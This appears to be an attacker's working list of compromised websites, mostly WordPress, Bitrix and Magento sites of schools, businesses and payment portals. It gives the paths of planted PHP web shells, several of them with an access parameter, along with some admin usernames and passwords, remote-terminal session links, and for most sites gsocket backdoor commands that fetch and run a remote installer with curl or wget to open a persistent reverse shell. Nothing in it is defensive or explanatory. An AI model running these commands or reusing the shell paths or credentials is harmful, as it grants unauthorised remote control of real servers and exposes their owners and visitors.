@@ -1,0 +1,1882 @@
+1. BACKUP DOMAIN: https://youthofindia.org.in/
+
+https://youthofindia.org.in/wp-content/themes/alone/woocommerce/global/wrapper.php
+
+https://youthofindia.org.in/wp-content/themes/alone/give/single-give-form/content-style-6.php?p=
+
+https://youthofindia.org.in/wp-admin/includes/litespeed.php
+
+--> gs-netcat -s "GXheZfekgEj3XiJKD5TYRY" -i
+
+--> S="GXheZfekgEj3XiJKD5TYRY" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="GXheZfekgEj3XiJKD5TYRY" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+https://okepaste.cc/r/dd9c13ac
+
+
+
+
+
+
+
+
+
+2. BACKUP DOMAIN: https://4focus.in/ 
+
+https://4focus.in/wp-content/themes/twentytwentyfive/patterns/testimonials-4-col.php
+
+https://4focus.in/wp-content/uploads/elementor-widget/class-pxl-menu-search.php
+
+https://4focus.in/wp-includes/sitemaps/class-wp-sitemaps-links.php
+
+https://4focus.in/wp-content/themes/twentytwentyfour/patterns/page-home-portfolio-links.php
+
+
+
+
+
+
+
+
+
+3. BACKUP DOMAIN: https://aswinayurvedplus.com/
+
+https://aswinayurvedplus.com/wp-content/themes/twentytwentyfive/patterns/template-query-loop-video-blog.php
+
+https://aswinayurvedplus.com/wp-admin/includes/class-wp-users-list-title.php
+
+https://aswinayurvedplus.com/wp-content/themes/twentytwentythree/patterns/hidden-no-setting.php
+
+https://aswinayurvedplus.com/wp-includes/customize/class-wp-customize-header-site-select.php
+
+https://okepaste.cc/r/44d3ff0e
+
+
+
+
+
+
+
+4. BACKUP DOMAIN: 
+
+https://aswinindustries.com/wp-includes/interactivity-api/class-wp-interactivity-api-rules.php
+
+https://aswinindustries.com/wp-content/themes/twentytwentyone/inc/menu-site-command.php
+
+https://aswinindustries.com/wp-content/themes/reobiz/page-header.php
+
+https://aswinindustries.com/wp-admin/includes/class-wp-media-list-system.php
+
+
+
+
+
+
+
+5. BACKUP DOMAIN: 
+
+https://atlastextile.in/wp-content/themes/twentytwentytwo/inc/patterns/general-list-setting.php
+
+https://atlastextile.in/wp-admin/includes/setting.php
+
+https://atlastextile.in/wp-content/themes/twentytwentyfour/patterns/template-index-menu.php
+
+atlastextile.in/public_html/wp-includes/blocks/require-include-blocks.php
+
+
+
+
+
+6. BACKUP DOMAIN: 
+
+https://balajikhiru.com/wp-content/themes/twentytwentyfour/patterns/hidden-posts-header.php
+
+https://balajikhiru.com/wp-content/themes/twentytwentythree/patterns/hidden-function.php
+
+https://balajikhiru.com/wp-includes/block-supports/source.php
+
+https://balajikhiru.com/wp-admin/includes/layout.php
+
+
+
+
+
+7
+
+https://npminternational.org/wp-content/themes/twentytwentythree/patterns/hidden-about.php
+
+https://npminternational.org/wp-content/themes/hello-elementor/includes/settings/settings-topbar.php
+
+https://npminternational.org/wp-content/plugins/google-captcha/includes/blog-help.php
+
+
+
+
+
+
+
+https://middlehitahttps://middlehitter.com/wp-includes/customize/class-wp-customize-nav-menu-item-about.phpter.com/wp-includes/customize/class-wp-customize-nav-menu-item-about.php
+
+https://middlehitter.com/?admisn-networksss
+
+https://middlehitter.com/.private/up.php?error
+
+https://labormanusa.com/wp-includes/comment.php?weddingphotographybysf=1&0=id
+
+https://middlehitter.com/wp-includes/sitemaps/providers/class-wp-sitemaps-profile.php
+
+https://middlehitter.com/wp-includes/interactivity-api/class-wp-interactivity-api-response.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://rcpackindia.com/wp-content/themes/poolax/template.php?Fox=d3wL7
+
+https://rcpackindia.com/wp-content/themes//var/www/u1273880/data/www/instrukcii.ru/wp-includes/js/jquery/ui/effect-floating.min.js
+
+
+
+https://dtmmconsulting.com/wp-content/themes/hello-elementor/includes/customizer/costumizer-theme.php Seobyjnx
+
+https://dtmmconsulting.com/wp-content/uploads/uploads.php?Fox=d3wL7
+
+
+
+
+
+syflextechnosolution.com/wp-content/themes/theme_by_samir/upload.php?Fox=d3wL7
+
+
+
+
+
+https://www.crcgroup.in/maesta-landing/landing-page/js/apaya.php
+
+https://www.crcgroup.in/wp-content/plugins/advanced-custom-fields/includes/ajax/class-acf-ajax-visitor.php
+
+https://crcgroup.in/wp-content/themes/crc/header-project.php
+
+https://www.crcgroup.in/login-84d92f3b1c/
+
+--> gs-netcat -s "dvz7xbuHvPk5gRuSjxuqhD" -i
+
+--> S="dvz7xbuHvPk5gRuSjxuqhD" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="dvz7xbuHvPk5gRuSjxuqhD" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://tipa.in/wp-content/plugins/wordfence/crypto/vendor/paragonie/sodium_compat/namespaced/Core/Curve25519/Ge/.default.php
+
+https://tipa.in/lms/assets/grocery_crud/themes/datatables/extras/TableTools/media/swf/parameters.php
+
+https://tipa.in/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/yii.php
+
+https://tipa.in/wp-includes/js/dist/script-modules/block-library/search/index.php?
+
+https://tipa.in/wp-content/themes/oceanwp/inc/themepanel/assets/images/plugin-icons/admin.php
+
+https://tipa.in/wp-admin/ tipa // adminptsmc
+
+--> gs-netcat -s "FA6EyY92fWYBiy4Zw8pz1q" -i
+
+--> S="FA6EyY92fWYBiy4Zw8pz1q" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="FA6EyY92fWYBiy4Zw8pz1q" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://www.crcgroup.in/wp-content/plugins/wp-user-avatar/third-party/vendor/stripe/stripe-php/lib/Service/V2/Core/service.php
+
+https://www.crcgroup.in/wp-content/themes/crc/craftassests/fonts/old/.defaultq.php
+
+--> gs-netcat -s "Bv59LgwooREdS8YvdJrWFh" -i
+
+--> S="Bv59LgwooREdS8YvdJrWFh" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="Bv59LgwooREdS8YvdJrWFh" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+https://www.crcgroup.in/wp-content/themes/crc/craftassests/fonts/old/.defaultq.php
+
+https://nhaclossless.com/assets/extensions/zerosonesfun-essential-audio/blog.php
+
+--> gs-netcat -s "4vFihcoGumWbRTz8Qp2PgR" -i
+
+--> S="4vFihcoGumWbRTz8Qp2PgR" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="4vFihcoGumWbRTz8Qp2PgR" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://www.glinki.ru/options.php
+
+https://www.glinki.ru/include/socket-tiktok.php
+
+https://www.glinki.ru/bitrix/components/bitrix/system.field.view/templates/url/site-templates.php
+
+gs-netcat -s ANmEgsPpjqY4Nfjm2qwuVw -i
+
+--> gs-netcat -s "38EjWTrQDqfdgX7BSjsbWe" -i
+
+--> S="38EjWTrQDqfdgX7BSjsbWe" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="38EjWTrQDqfdgX7BSjsbWe" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://makepayment.in/dbsbaijalbari/easebuzz-lib/security.php
+
+https://makepayment.in/mphccagt_SIB_backup/validation.php
+
+https://makepayment.in/janthum/easebuzz-lib/history.php
+
+makepayment.in/gnextkhowai/images/apaya.php
+
+https://makepayment.in/hcssilchar/validation-theme.php?Fox=d3wL7
+
+https://makepayment.in/mazzjowai/includes/connection.php
+
+--> gs-netcat -s "75DfGWgYxPXWovrDFQx9iy" -i
+
+--> S="75DfGWgYxPXWovrDFQx9iy" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="75DfGWgYxPXWovrDFQx9iy" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+http://staging.adplindia.in/wp-content/themes/woostify/template-option.php
+
+
+
+
+
+https://kinelu.co.uk/wp-content/plugins/hostinger-ai-assistant/vendor/league/commonmark/src/Extension/CommonMark/Renderer/Inline/BlockQuoteRenderer.php
+
+https://kinelu.co.uk/wp-content/plugins/wpforms-lite/vendor_prefixed/ezyang/htmlpurifier/library/HTMLPurifier/AttrDef/URI/Email/SimpleTraffic.php
+
+https://kinelu.co.uk/wp-content/plugins/internal-links/vendor/freemius/wordpress-sdk/templates/js/Option.php
+
+https://kinelu.co.uk/wp-content/themes/trustnews/theme.php
+
+https://blogmaagzine.com/wp-content/themes/oceanwp/option.php?Fox=d3wL7
+
+https://blogstrove.co.uk/wp-content/themes/smart-mag/site.php
+
+--> gs-netcat -s "7jkAPZWmXv6PpzAtyfEb5M" -i
+
+--> S="7jkAPZWmXv6PpzAtyfEb5M" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="7jkAPZWmXv6PpzAtyfEb5M" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://infinityinfo.co.uk/wp-admin/ teamptsmc:Seobyjnx
+
+
+
+
+
+https://avtoshkolaperspektiva.ru/bitrix/components/bitrix/landing.demo/data/page/store-chats-dark/about/lang/de/template.php
+
+https://avtoshkolaperspektiva.ru/local/templates/main_new/components/bitrix/news/gallery/bitrix/iblock.vote/ajax/lang/ru/Lang.php
+
+https://avtoshkolaperspektiva.ru/bitrix/components/bitrix/landing.demo/data/page/agency/.event.php?Fox=d3wL7
+
+https://sshx.io/s/c8Jwz5KBc6#QEebmQ8bVIM5J2
+
+--> gs-netcat -s "9vzVAGzqqUGPGFXgh5Ykxt" -i
+
+--> S="9vzVAGzqqUGPGFXgh5Ykxt" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="9vzVAGzqqUGPGFXgh5Ykxt" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://dmtoy.ru/local/components/pai/cookie.alert/templates/.default/lang/ru/yi.php
+
+https://dmtoy.ru/local/php_interface/classes/dmtoy/ProductDataSync.php
+
+https://dmtoy.ru/include/blocks/catalog/catalog_in_list.php
+
+
+
+
+
+https://liquidynamics.com/public/admin_assets/UIFramework/js/plugins/ckeditor/plugins/specialchar/dialogs/lang/ptsmc.php
+
+https://liquidynamics.com/liquidynamics/Admin/Views/new/product_assets/ProductAssetsModel.php
+
+https://liquidynamics.com/liquidynamics/Home/Views/old/common/remote/net.php
+
+https://liquidynamics.com/writable/files/resource_images/2.php
+
+S="BQtkRfpqW5Fcxm5BzjpVoU" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+
+
+
+
+https://turbos.pe/wp-content/plugins/wpforms-lite/vendor_prefixed/ezyang/htmlpurifier/library/HTMLPurifier/AttrDef/HTML/Sitebar.php
+
+https://turbos.pe/wp-content/themes/top-store/theme.php
+
+https://turbos.pe/wp-content/plugins/dokan-pro/vendor/google/gax/metadata/ApiCore/Testing/yi.php
+
+https://turbos.pe/wp-content/plugins/wpforms-lite/vendor_prefixed/ezyang/htmlpurifier/library/HTMLPurifier/AttrDef/HTML/Sitebar.php
+
+https://abancay.com.pe/wp-content/themes/th-shop-mania/option.php?Fox=d3wL7
+
+--> gs-netcat -s "9YpZSruLqu9N1FivdTgfbc" -i
+
+--> S="9YpZSruLqu9N1FivdTgfbc" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="9YpZSruLqu9N1FivdTgfbc" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://part4usa.ru/bitrix/modules/bitrix.siteinfoportal/install/wizards/bitrix/infoportal/site/templates/info_light/components/bitrix/news/national_news/bitrix/iblock.vote/.default/lang/en/sitemap.php
+
+https://part4usa.ru/bitrix/modules/forum/install/components/bitrix/forum.interface/templates/popup/config.php
+
+https://part4usa.ru/bitrix/wizards/bitrix/eshop/site/services/advertising/option.php?Fox=d3wL7
+
+--> S="DJ1jiLVLqq29TVXs53iAQP" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="DJ1jiLVLqq29TVXs53iAQP" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+http://autogas.in.ua/bitrix/components/bitrix/photogallery/templates/old/bitrix/search.page/.default/lang/ua/ptsmc.php
+
+http://autogas.in.ua/bitrix/templates/autogas_copy/components/bitrix/news/courses/bitrix/news.detail/.default/lang/en/layout.php
+
+http://autogas.in.ua/bitrix/components/bitrix/blog/templates/one_blog/lang/ru/help/template.php
+
+--> gs-netcat -s "GVkpZrXPP7R1RDN2fEsXEX" -i
+
+--> S="GVkpZrXPP7R1RDN2fEsXEX" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="GVkpZrXPP7R1RDN2fEsXEX" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+ 
+
+Ready
+
+https://alt-online.ru/bitrix/modules/ui/install/js/ui/userfieldfactory/lang/en/template.php
+
+https://alt-online.ru/bitrix/modules/socialnetwork/install/components/bitrix/socialnetwork.menu/lang/ru/composer.php
+
+https://alt-online.ru/bitrix/cache/s1/bitrix/menu/06f.~418647/ff/ff7a6tsda65sd46a0d4eb5d848234.php
+
+https://alt-online.ru/bitrix/activities/bitrix/requestinformationoptionalactivity/properties.php
+
+--> gs-netcat -s "eWxEXj4MG8PsxHyDZQgMQ7" -i
+
+--> S="eWxEXj4MG8PsxHyDZQgMQ7" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="eWxEXj4MG8PsxHyDZQgMQ7" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://www.archiv.ru/bitrix/components/bitrix/landing.demo/data/site/agency/lang/ru/template.php
+
+https://www.archiv.ru/bitrix/wizards/inteo/corporation/site/templates/inteo_corporation/components/bitrix/news/projects/lang/ru/header.php
+
+https://www.archiv.ru/bitrix/components/bitrix/news/templates/web20/bitrix/search.form/flat/lang/ru/component.php
+
+gs-netcat -s B3YCETU3FAA7y3JqdNx2ep -i
+
+
+
+
+
+https://doorhan.ru/bitrix/templates/doorhan/components/bitrix/catalog/service/bitrix/catalog.section.list/.default/lang/en/.cache.php
+
+https://doorhan.ru/bitrix/templates/doorhan/components/bitrix/catalog/main_products/bitrix/catalog.section.list/.default/lang/en/index.php
+
+https://doorhan.ru/bitrix/components/bitrix/photogallery_user/templates/.default/bitrix/search.tags.cloud/photogallery/lang/en/.parameters.php
+
+
+
+
+
+https://upmspresult.in/backpanel/fonts/fontawesome/page.php
+
+https://upmspresult.in/backpanel/result/detail_local_mediate_result_new.php
+
+https://upmspresult.in/admission/manage_view.php
+
+https://upmspresult.in/backpanel/images/photos/image.php
+
+https://upmspresult.in/config.php
+
+https://ccsuonlineresult.in/about.php
+
+https://edistrictodishagovin.com/config.php
+
+https://jkboses.com/header.php
+
+https://kalyani.org.in/issue.php
+
+https://ksoumysore.in/net.php
+
+--> gs-netcat -s "25fJrJqAQvG5e6r8KmXRu9" -i
+
+--> S="25fJrJqAQvG5e6r8KmXRu9" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="25fJrJqAQvG5e6r8KmXRu9" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://oasisitstore.in/system/library/export_import/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Shared/Escher/DggContainer/BstoreContainer/BSE/Blop.phptstore.in/system/library/export_import/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Shared/Escher/DggContainer/BstoreContainer/BSE/Blop.php
+
+https://oasisitstore.in/system/library/tmdsocial/src/Facebook/GraphNodes/Graphsesion.php
+
+https://oasisitstore.in/system/library/kbsupercheckout/maxmind/maxmind/maxmind/web-service-common/src/Exception/LoaderServiceException.php
+
+
+
+
+
+
+
+https://artpatent.ru/bitrix/components/aspro/regionality.list.allcorp3/templates/popup_regions_small/lang/ru/lang.php
+
+https://artpatent.ru/bitrix/modules/location/install/js/location/css/image/marker.php
+
+https://artpatent.ru/bitrix/modules/main/install/components/bitrix/main.sidepanel.toolbar/templates/.default/.default.php
+
+
+
+
+
+https://mypartner.kz/bitrix/modules/iblock/lib/Integration/UI/Grid/Property/Type/system.php
+
+https://mypartner.kz/bitrix/modules/search/install/components/bitrix/search.suggest.input/lang/en/parameters.php
+
+
+
+
+
+https://iplmatcheslive.com/wp-content/plugins/link-whisper-premium/vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Shared/Escher/DggContainer/BstoreContainer/BSE/Blop.php
+
+https://iplmatcheslive.com/wp-content/plugins/web-stories/third-party/vendor/fasterimage/fasterimage/src/FasterImage/Exception/InvalidImage.php
+
+https://iplmatcheslive.com/wp-content/plugins/astra-addon/classes/builder/type/header/menu/assets/js/Unlimited.php
+
+https://iplmatcheslive.com/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Parser/Url/UrlInterface.php
+
+--> gs-netcat -s "6covxRY2XJeZoThmCkkB7q" -i
+
+--> S="6covxRY2XJeZoThmCkkB7q" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="6covxRY2XJeZoThmCkkB7q" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://abvv-wvl.be/result2012/input/layout/images/yii.php
+
+https://abvv-wvl.be/joomla/templates/rhuk_milkyway/html/module.php
+
+https://abvv-wvl.be/sohappy/layout/code/class.readerfiles.php
+
+https://abvv-wvl.be/1mei/2017/index3.php
+
+
+
+
+
+
+
+https://abcduweb.fr/wp-content/plugins/google-site-kit/third-party/phpseclib/phpseclib/phpseclib/Math/BigInteger/Engines/BCMath/Reductions/SiteBarret.php
+
+https://abcduweb.fr/wp-content/themes/Divi/includes/builder/frontend-builder/assets/vendors/plugins/image/plugin.min.php
+
+https://abcduweb.fr/wp-content/plugins/woocommerce/assets/client/admin/product-editor/blocks/product-fields/notice-edit-single-variation/index.php
+
+--> gs-netcat -s "5cxPixzsZcHNFJ4tSCvmLf" -i
+
+--> S="5cxPixzsZcHNFJ4tSCvmLf" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="5cxPixzsZcHNFJ4tSCvmLf" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://dairyyellowpages.com/firebase/vendor/kreait/firebase-tokens/src/Firebase/Auth/Token/Domain/validator.php
+
+https://dairyyellowpages.com/admin/excel/PHPExcel/PHPExcel/Shared/Escher/DgContainer/SpgrContainer/container.php
+
+https://dairyyellowpages.com/admin/assets/ckeditor/samples/plugins/dialog/assets/dialog.php
+
+https://dairyyellowpages.com/admin/assets/ckeditor/plugins/pramukhime/css/.default.php
+
+
+
+
+
+
+
+https://signaturewall.in/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Unlock.php
+
+https://signaturewall.in/wp-content/plugins/wpforms-lite/vendor/woocommerce/action-scheduler/lib/cron-expression/aCronExpression_DayOfTimeField.php
+
+--> gs-netcat -s "2GzpdEqefhttsbA6i6QNWf" -i
+
+--> S="2GzpdEqefhttsbA6i6QNWf" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="2GzpdEqefhttsbA6i6QNWf" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://www.uptivo.fit/__MACOSX/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Integrations/Elementor/Config/DynamicElements/EssentialAddons/._ContentTime.php
+
+https://www.uptivo.fit/wp-content/plugins/wordpress-seo/vendor_prefixed/league/oauth2-client/src/OptionProvider/AuthenticationProvider.php
+
+https://www.uptivo.fit/wp-content/plugins/sitepress-multilingual-cms/classes/notices/translation-jobs-migration/class-wpml-tm-migration-logger.php
+
+--> gs-netcat -s "9m81Jc1piwT3ykkW22sUtb" -i
+
+--> S="9m81Jc1piwT3ykkW22sUtb" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="9m81Jc1piwT3ykkW22sUtb" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://internetsearchinc.com/wp-content/plugins/google-site-kit/third-party/google/apiclient-services/src/SiteVerification/Resource/SiteResource.php
+
+https://internetsearchinc.com/wp-content/plugins/WP_Estimation_Form/includes/dompdf/dompdf/dompdf/src/Adapter/GDFNet.php
+
+https://internetsearchinc.com/wp-content/themes/astra/inc/builder/type/header/html/assets/.default.php
+
+https://internetsearchinc.com/wp-content/plugins/wp-rocket/inc/Dependencies/ActionScheduler/lib/cron-expression/CronExpression_SecondsField.php
+
+--> gs-netcat -s "6WMxsgxK2ZJRKvEo97sSto" -i
+
+--> S="6WMxsgxK2ZJRKvEo97sSto" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="6WMxsgxK2ZJRKvEo97sSto" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://magnetkontor.de/media/catalog/product/cache/e793809b0880f758cc547e70c93ae203/2/7/279_O.php
+
+https://magnetkontor.de/media/catalog/product/cache/e793809b0880f758cc547e70c93ae203/6/1/619_O.php
+
+https://magnetkontor.de/media/catalog/product/cache/e6870fb0add288c7aecccf7eff7d725a/q/u/yii.php/
+
+https://magnetkontor.de/media/catalog/product/cache/6360e336b2a70951114dbd37294096ee/m/s/exp.php
+
+--> gs-netcat -s "8areunWTt2o2KLFLXTAp9B" -i
+
+--> S="8areunWTt2o2KLFLXTAp9B" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="8areunWTt2o2KLFLXTAp9B" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://www.kymco.at/pub/static/frontend/Newluma/luma_child/de_DE/Magento_Payment/js/model/credit-card-validation/expiration-date-validator/parse-time.php
+
+https://www.kymco.at/pub/static/frontend/Smartwave/porto/de_DE/Vertex_AddressValidation/js/view/checkout/shipping/address-verification.php
+
+https://www.kymco.at/pub/static/frontend/Smartwave/porto_rtl/de_DE/Magento_InventoryInStorePickupFrontend/js/view/form/element/contact.php
+
+https://www.kymco.at/pub/static/adminhtml/Magento/backend/en_US/Magento_PageBuilder/ts/js/content-type/buttons/converter/style/preview/display/flex.php
+
+--> gs-netcat -s "4sTsQCqLJnS2WCJdKm1S4T" -i
+
+--> S="4sTsQCqLJnS2WCJdKm1S4T" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="4sTsQCqLJnS2WCJdKm1S4T" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://cbsua.edu.ph/wp-content/plugins/wp-file-managerx/lib/codemirror/mode/turtle/.default.php
+
+https://cbsua.edu.ph/wp-content/plugins/unlimited-elements-for-elementor-premium/vendor/twig/twig/lib/Twig/Node/Expression/Test/Add.php
+
+https://cbsua.edu.ph/wp-content/plugins/wordfence/crypto/vendor/paragonie/sodium_compat/src/Core32/Curve25519/yii.php
+
+--> gs-netcat -s "9NUipvUiXwrL33VhiG4RRr" -i
+
+--> S="9NUipvUiXwrL33VhiG4RRr" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="9NUipvUiXwrL33VhiG4RRr" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://www.uniters.com/static/frontend/Pearl/weltpixel_custom/fr_FR_tmp/Magento_Ui/templates/form/components/collection/preview.php
+
+https://www.uniters.com/static/frontend/Pearl/weltpixel_fsn/fr_FR/Ced_EbayMultiAccount/template/grid/filters/elements/ui-select.php
+
+https://www.uniters.com/static/adminhtml/Magento/backend/fr_FR/Magento_PageBuilder/ts/js/content-type/buttons/converter/style/preview/display/flex.php
+
+https://www.uniters.com/static/frontend/Pearl/weltpixel/en_US_tmp/jquery/editableMultiselect/.default.php
+
+https://www.uniters.com/static/frontend/Pearl/weltpixel/fr_FR/Magento_Catalog/template/product/link.php
+
+--> gs-netcat -s "ACYMejAdFoDLzTXgLXkPAC" -i
+
+--> S="ACYMejAdFoDLzTXgLXkPAC" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="ACYMejAdFoDLzTXgLXkPAC" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+https://sshx.io/s/Cc5vaBk76R#dkEKvR92jQW8kL
+
+
+
+
+
+
+
+https://jol.at/dev/tests/api-functional/testsuite/Magento/TestModuleOverrideConfig/AbstractOverridesSite.php
+
+https://jol.at/dev/tests/api-functional/_files/Magento/TestModuleJoinDirectives/regist.php
+
+https://jol.at/dev/tests/setup-integration/_files/Magento/TestSetupDeclarationModule1/.default.php
+
+
+
+
+
+
+
+
+
+https://www.mutat.id/wp-content/plugins/fast-indexing-api/vendor/phpseclib/phpseclib/phpseclib/System/SSH/Common/Traits/yii.php
+
+https://mutat.id/wp-content/plugins/fast-indexing-api/vendor/google/apiclient/src/.default.php
+
+https://mutat.id/wp-content/plugins/fast-indexing-api/vendor/phpseclib/phpseclib/phpseclib/Crypt/Common/Formats/Keys/PKCS7.php
+
+
+
+
+
+/READY
+
+https://shop.badagoni.com/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/super.php
+
+https://shop.badagoni.com/wp-content/plugins/woocommerce-multilingual/vendor/otgs/installer/includes/CDTClient/Api/Endpoints/v1/Requests/Actions/AddStats/.default.php
+
+https://shop.badagoni.com/wp-content/plugins/woocommerce-multilingual/addons/wpml-dependencies/vendor/otgs/icons/plugin-icons/wpml/gfml/index.php
+
+--> gs-netcat -s "Hogxb3GjC17oUSakoj8uUV" -i
+
+--> S="Hogxb3GjC17oUSakoj8uUV" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="Hogxb3GjC17oUSakoj8uUV" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+https://davchennai.org/gillnagar.davchennai.org/wp-content/plugins/the-events-calendar/common/vendor/vendor-prefixed/stellarwp/container-contract/src/ContainerSite.php
+
+https://davchennai.org/ios-jaipur.davchennai.org/wp-content/themes/neve/header-footer-grid/assets/css/admin/customizer/ptsmc.php
+
+https://davchennai.org/gillnagar.davchennai.org/wp-content/themes/astra/assets/css/unminified/compatibility/page-builder/plugin.php
+
+https://davchennai.org/college-smkfomra.davchennai.org/wp-content/themes/sydney/tests/footer/footer.php
+
+--> gs-netcat -s "AHT8YwAj3JFt1KptavtUCR" -i
+
+--> S="AHT8YwAj3JFt1KptavtUCR" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="AHT8YwAj3JFt1KptavtUCR" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://kormansigns.com/pub/static/frontend/Smartwave/porto_rtl/en_US/extjs/resources/images/default/dd/.default.php
+
+https://kormansigns.com/pub/static/frontend/Smartwave/porto_child/en_US/Magento_Tax/template/checkout/shipping_method/price.php
+
+https://kormansigns.com/dev/tests/integration/testsuite/Magento/Widget/Block/Adminhtml/Widget/Instance/Edit/Tab/Main/layout.php
+
+https://kormansigns.com/setup/src/Magento/Setup/Test/Unit/Module/Di/_files/app/code/Magento/SomeModule/etc/source/source.php
+
+--> gs-netcat -s "8wwMe8ipHSKsz7aUdvRxLZ" -i
+
+--> S="8wwMe8ipHSKsz7aUdvRxLZ" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="8wwMe8ipHSKsz7aUdvRxLZ" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+https://ucoer.edu.in/assets/Font-Awesome-master/src/3.2.1/assets/font-awesome/font/.default.php
+
+https://ucoer.edu.in/assets/Font-Awesome-master/src/3.2.1/icons/index.php
+
+https://ucoer.edu.in/assets/dist/js/functions.php
+
+--> gs-netcat -s "SA7kFUaMt3z3ZnjnQtfDCb" -i
+
+--> S="SA7kFUaMt3z3ZnjnQtfDCb" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="SA7kFUaMt3z3ZnjnQtfDCb" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+
+
+https://revista.infectologia.info/lib/pkp/lib/vendor/laravel/framework/src/Illuminate/Foundation/resources/exceptions/renderer/components/layout.php
+
+https://revista.infectologia.info/plugins/reports/reviewReport/locale/fr_CA/.default.php
+
+https://revista.infectologia.info/lib/pkp/controllers/grid/settings/languages/ManagerSource.php
+
+https://revista.infectologia.info/lib/pkp/lib/vendor/symfony/clock/NativeTime.php
+
+--> gs-netcat -s "HFzcLr85fQEwrVhQhbQU4t" -i
+
+--> S="HFzcLr85fQEwrVhQhbQU4t" bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+--> S="HFzcLr85fQEwrVhQhbQU4t" bash -c "$(wget -qO- https://gsocket.io/y)"
+
+
+
+
+
+
+
+//READY
+
+https://al-rashedgroup.com/core/themes/stable/css/ckeditor/plugins/drupalimagecaption/.default.php
+
+https://al-rashedgroup.com/core/modules/config/tests/config_collection_clash_install_test/config/install/another_collection/collection.php
+
+https://al-rashedgroup.com/core/modules/system/tests/modules/accept_header_routing_test/src/Routing/AcceptHeader.php
+
+https://al-rashedgroup.com/core/modules/workflows/tests/modules/workflow_third_party_settings_test/config/schema/setting.php
+
+https://al-rashedgroup.com/sites/all/modules/video_embed_field/tests/modules/video_embed_field_mock_provider/src/index.php
+
+
+
+
+
+
+
+
+
+https://usk2.lodz.pl/wp-content/plugins/wordpress-seo/vendor_prefixed/league/oauth2-client/src/Grant/Exception/.default/index.php
+
+https://usk2.lodz.pl/wp-content/plugins/wordpress-seo/src/dashboard/infrastructure/score-results/readability-score-results/readability-score-tester.php
+
+https://usk2.lodz.pl/wp-includes/sodium_compat/src/Core32/Curve25519/Ge/imd1-3.php  S0L0K1LL3R
+
+https://usk2.lodz.pl/wp-content/themes/usk-wam/assets/SASS/layout/footers.php
+
+gs-netcat -s FSHZTXgf2F7bGBGX5oe8FL -i
+
+
+
+
+
+
+
+
+
